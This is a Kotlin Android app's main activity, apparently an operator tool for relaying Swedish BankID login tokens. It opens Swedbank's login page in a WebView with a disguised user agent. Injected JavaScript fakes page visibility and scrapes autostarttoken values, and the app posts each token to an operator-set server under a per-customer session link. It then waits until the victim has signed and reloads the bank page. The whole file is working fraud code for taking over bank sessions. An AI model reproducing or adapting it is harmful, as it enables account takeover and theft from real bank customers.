package com.relay

import android.app.Activity
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.os.Message
import android.view.ViewGroup
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import java.io.BufferedReader
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : Activity() {

    private lateinit var web: WebView
    private lateinit var bar: TextView
    private lateinit var field: EditText
    private lateinit var modeBtn: Button
    private lateinit var p: SharedPreferences

    private var baseUrl = ""
    private var last = ""
    private var doneSeen = false
    private var busy = false
    private var kund = true
    private var alive = true
    private var reloaded = false

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        p = getSharedPreferences("relay", 0)
        baseUrl = p.getString("base", "") ?: ""
        kund = p.getBoolean("kund", true)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        ui()
        alive = true
        tick()
    }

    private fun ui() {
        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL

        val top = LinearLayout(this)
        top.orientation = LinearLayout.HORIZONTAL

        field = EditText(this)
        field.hint = "server-url"
        field.setText(baseUrl)
        top.addView(field, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))

        val run = Button(this)
        run.text = "KOR"
        run.setOnClickListener {
            baseUrl = field.text.toString().trim().trimEnd('/')
            p.edit().putString("base", baseUrl).apply()
            doneSeen = false
            reloaded = false
            last = ""
            if (p.getString("code", "") == null || (p.getString("code", "") ?: "").isEmpty()) newSession()
            bar.text = "laddar banksidan"
            web.loadUrl(p.getString("bank", "https://online.swedbank.se/") ?: "https://online.swedbank.se/")
        }
        top.addView(run, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        modeBtn = Button(this)
        modeBtn.text = if (kund) "KUND" else "OP"
        modeBtn.setOnClickListener {
            kund = !kund
            modeBtn.text = if (kund) "KUND" else "OP"
            p.edit().putBoolean("kund", kund).apply()
        }
        top.addView(modeBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        val om = Button(this)
        om.text = "OM"
        om.setOnClickListener { web.reload() }
        top.addView(om, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        val ny = Button(this)
        ny.text = "KOD"
        ny.setOnClickListener { newSession() }
        top.addView(ny, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        root.addView(top)

        bar = TextView(this)
        bar.textSize = 12f
        bar.setBackgroundColor(Color.parseColor("#101010"))
        bar.setTextColor(Color.parseColor("#66ff88"))
        bar.setPadding(14, 10, 14, 10)
        bar.text = "redo"
        bar.setOnLongClickListener { newSession(); true }
        root.addView(bar)

        web = WebView(this)
        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.databaseEnabled = true
        try {
            web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
        } catch (t: Throwable) {}

        web.webViewClient = object : WebViewClient() {

            override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
                val s = r.url.toString()
                val t = tok(s)
                if (t != null) {
                    grab(t)
                    return true
                }
                if (s.startsWith("bankid:") || s.startsWith("intent:")) return true
                return false
            }

            override fun doUpdateVisitedHistory(v: WebView, url: String?, isReload: Boolean) {
                if (url == null) return
                var s = url.replace("https://", "").replace("http://", "")
                if (s.length > 64) s = s.substring(0, 64)
                bar.text = s
            }
        }

        web.webChromeClient = object : WebChromeClient() {
            override fun onCreateWindow(v: WebView, isDialog: Boolean, isUserGesture: Boolean, msg: Message): Boolean {
                return false
            }
        }

        web.addJavascriptInterface(Bridge(), "Relay")

        root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
        setContentView(root)
    }

    private inner class Bridge {
        @JavascriptInterface
        fun tok(t: String) {
            runOnUiThread { grab(t) }
        }
    }

    private fun tok(s: String): String? {
        val m = Regex("[?&]autostarttoken=([0-9a-fA-F-]{36})").find(s)
        if (m == null) return null
        return m.groupValues[1]
    }

    private fun grab(t: String) {
        if (t == last) return
        last = t
        val c = p.getString("code", "") ?: ""
        if (c.isEmpty()) { newSession(); return }
        bar.text = "TOKEN SKICKAD till kund " + c
        post("/api/session/" + c + "/token", t)
        if (!kund) {
            try {
                startActivity(Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://app.bankid.com/?autostarttoken=" + t + "&redirect=null")))
            } catch (x: Throwable) {}
        }
    }

    private fun newSession() {
        if (baseUrl.isEmpty()) { bar.text = "skriv server-url forst"; return }
        var c = ""
        try {
            val con = URL(baseUrl + "/api/session").openConnection() as HttpURLConnection
            con.requestMethod = "POST"
            con.connectTimeout = 8000
            con.readTimeout = 8000
            val br = BufferedReader(con.inputStream.reader())
            var line = br.readLine()
            while (line != null) {
                val m = Regex("\"code\"\\s*:\\s*\"([A-Za-z0-9]+)\"").find(line)
                if (m != null) c = m.groupValues[1]
                line = br.readLine()
            }
            br.close()
            con.disconnect()
        } catch (t: Throwable) {
            bar.text = "kunde inte skapa session"
        }
        if (c.isNotEmpty()) {
            p.edit().putString("code", c).apply()
            last = ""
            doneSeen = false
            reloaded = false
            bar.text = "KUNDLANK: " + baseUrl + "/k/" + c
        }
    }

    private fun post(path: String, body: String) {
        if (baseUrl.isEmpty()) return
        val b = baseUrl
        Thread {
            try {
                val con = URL(b + path).openConnection() as HttpURLConnection
                con.requestMethod = "POST"
                con.doOutput = true
                con.setRequestProperty("Content-Type", "text/plain")
                con.connectTimeout = 8000
                con.readTimeout = 8000
                con.outputStream.write(body.toByteArray())
                con.outputStream.flush()
                con.responseCode
                con.disconnect()
            } catch (t: Throwable) {}
        }.start()
    }

    private fun checkDone() {
        if (doneSeen || busy) return
        if (baseUrl.isEmpty()) return
        val c = p.getString("code", "") ?: ""
        if (c.isEmpty()) return
        busy = true
        var hit = false
        try {
            val con = URL(baseUrl + "/api/session/" + c + "/state").openConnection() as HttpURLConnection
            con.connectTimeout = 5000
            con.readTimeout = 5000
            val br = con.inputStream.bufferedReader()
            var line = br.readLine()
            while (line != null) {
                if (line.indexOf("done") >= 0 || line.indexOf("signed") >= 0) hit = true
                line = br.readLine()
            }
            br.close()
            con.disconnect()
        } catch (t: Throwable) {}
        busy = false
        if (hit) {
            doneSeen = true
            runOnUiThread { bar.text = "KUND KLAR - vantar pa banken" }
            if (!reloaded) {
                reloaded = true
                try { Thread.sleep(4000) } catch (t: Throwable) {}
                runOnUiThread { try { web.reload() } catch (t: Throwable) {} }
            }
        }
    }

    private fun tick() {
        val nudge = "(function(){try{Object.defineProperty(document,'hidden',{get:function(){return false}});" +
            "Object.defineProperty(document,'visibilityState',{get:function(){return 'visible'}})}catch(e){}" +
            "try{window.dispatchEvent(new Event('focus'))}catch(e){}" +
            "try{document.dispatchEvent(new Event('visibilitychange'))}catch(e){}" +
            "try{window.dispatchEvent(new Event('pageshow'))}catch(e){}" +
            "if(!window.__rh){window.__rh=1;setInterval(function(){try{" +
            "var a=document.querySelector('a[href*=autostarttoken]');" +
            "if(a&&a.href){var m=/[?&]autostarttoken=([0-9a-fA-F-]{36})/.exec(a.href);" +
            "if(m)Relay.tok(m[1])}}catch(e){}},800)}})()"

        Thread {
            while (alive) {
                try { Thread.sleep(2500) } catch (t: Throwable) {}
                runOnUiThread {
                    try { web.evaluateJavascript(nudge, null) } catch (t: Throwable) {}
                }
                try { checkDone() } catch (t: Throwable) {}
            }
        }.start()
    }

    override fun onDestroy() {
        alive = false
        super.onDestroy()
    }

    override fun onBackPressed() {
        if (web.canGoBack()) web.goBack() else super.onBackPressed()
    }
}
